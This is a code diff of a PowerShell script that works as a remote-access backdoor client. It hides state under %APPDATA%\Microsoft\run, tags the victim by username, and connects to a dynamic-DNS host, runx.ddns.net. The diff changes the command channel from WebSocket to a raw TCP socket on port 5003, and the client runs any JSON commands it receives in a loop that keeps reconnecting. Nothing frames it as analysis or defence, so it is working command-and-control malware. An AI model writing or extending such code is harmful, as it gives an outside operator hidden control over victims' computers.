@@ -8,8 +8,8 @@ if (-not $m2.WaitOne(0)) {
   exit
 }
 
-$VPS_WS_URL = "ws://runx.ddns.net/ws/client"
-$VPS_POLL_URL = "http://runx.ddns.net/api/poll"
+$VPS_HOST = "runx.ddns.net"
+$VPS_PORT = 5003
 $IdPath = "$env:APPDATA\Microsoft\run\run.txt"
 
 if (Test-Path $IdPath) {
@@ -27,7 +27,7 @@ else {
 }
 
 $uniqueUser = "$($env:USERNAME)-$uniqueId-W"
-$SCRIPT_VERSION = "2af43f8"
+$SCRIPT_VERSION = "ab44043"
 $clientVersion = $SCRIPT_VERSION
 
 $logDir = "$env:APPDATA\Microsoft\run"
@@ -91,63 +91,46 @@ function Execute-CommandPayload ($r) {
 try {
   while ($true) {
     try {
-      $safeUser = [System.Uri]::EscapeDataString([string]$uniqueUser)
-      $safeVer = [System.Uri]::EscapeDataString([string]$clientVersion)
-      $wsUriStr = $VPS_WS_URL + "?username=" + $safeUser + "&version=" + $safeVer + "&client_type=cmd"
-      Log-Msg "[INFO] Connecting WebSocket to $wsUriStr..."
+      Log-Msg "[INFO] Connecting to TCP socket $VPS_HOST:$VPS_PORT..."
+      $tcpClient = New-Object System.Net.Sockets.TcpClient
+      $tcpClient.Connect($VPS_HOST, $VPS_PORT)
 
-      $uri = New-Object System.Uri($wsUriStr)
-      $ws = New-Object System.Net.WebSockets.ClientWebSocket
-      $ws.Options.KeepAliveInterval = [TimeSpan]::FromSeconds(15)
+      if ($tcpClient.Connected) {
+        Log-Msg "[INFO] TCP connection established successfully."
+        $stream = $tcpClient.GetStream()
+        $reader = New-Object System.IO.StreamReader($stream, [System.Text.Encoding]::UTF8)
+        $writer = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::UTF8)
+        $writer.AutoFlush = $true
 
-      $cts = New-Object System.Threading.CancellationTokenSource
-      $cts.CancelAfter(10000)
+        $hsObj = @{ username = $uniqueUser; version = $clientVersion; client_type = "cmd" } | ConvertTo-Json -Compress
+        $writer.WriteLine($hsObj)
 
-      $ws.ConnectAsync($uri, $cts.Token).Wait()
-
-      if ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
-        Log-Msg "[INFO] WebSocket connection established successfully."
-        $buffer = [System.ArraySegment[byte]]::new((New-Object byte[] 8192))
-
-        while ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
-          $ms = New-Object System.IO.MemoryStream
-          $closeReceived = $false
-
-          do {
-            $receiveTask = $ws.ReceiveAsync($buffer, [System.Threading.CancellationToken]::None)
-            $receiveTask.Wait()
-            $result = $receiveTask.Result
-
-            if ($result.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) {
-              $closeReceived = $true
-              break
-            }
-
-            if ($result.Count -gt 0) {
-              $ms.Write($buffer.Array, $buffer.Offset, $result.Count)
-            }
-          } while (-not $result.EndOfMessage -and $ws.State -eq [System.Net.WebSockets.WebSocketState]::Open)
-
-          if ($closeReceived) {
-            Log-Msg "[INFO] WebSocket received close frame from server."
-            try {
-              $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "", [System.Threading.CancellationToken]::None).Wait()
-            }
-            catch {}
+        while ($tcpClient.Connected) {
+          $line = $reader.ReadLine()
+          if ($null -eq $line) {
+            Log-Msg "[INFO] Server closed TCP connection."
             break
           }
 
-          if ($ms.Length -gt 0) {
-            $jsonStr = [System.Text.Encoding]::UTF8.GetString($ms.ToArray())
-            Log-Msg "[INFO] Received WebSocket data: $jsonStr"
-            $r = $jsonStr | ConvertFrom-Json
-            Execute-CommandPayload $r
+          if ($line -match '"type":\s*"ping"') {
+            $writer.WriteLine('{"type":"pong"}')
+            continue
           }
+
+          Log-Msg "[INFO] Received TCP payload: $line"
+          $r = $line | ConvertFrom-Json
+          Execute-CommandPayload $r
         }
       }
     }
     catch {
-      Log-Msg "[ERROR] WebSocket Connection Error: $($_.Exception.ToString())"
+      Log-Msg "[ERROR] TCP Connection Error: $($_.Exception.ToString())"
+    }
+    finally {
+      if ($tcpClient) {
+        $tcpClient.Close()
+        $tcpClient.Dispose()
+      }
     }
 
     Log-Msg "[INFO] Reconnecting in 3 seconds..."
